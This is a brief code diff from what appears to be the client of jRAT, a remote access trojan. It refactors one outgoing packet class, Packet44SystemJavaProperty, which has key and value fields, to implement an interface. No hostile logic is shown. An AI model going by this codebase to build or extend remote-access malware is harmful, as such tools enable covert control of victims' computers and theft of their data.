@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet44SystemJavaProperty extends AbstractOutgoingPacket {
+public class Packet44SystemJavaProperty implements OutgoingPacket {
 
 	private String key;
 	private String value;
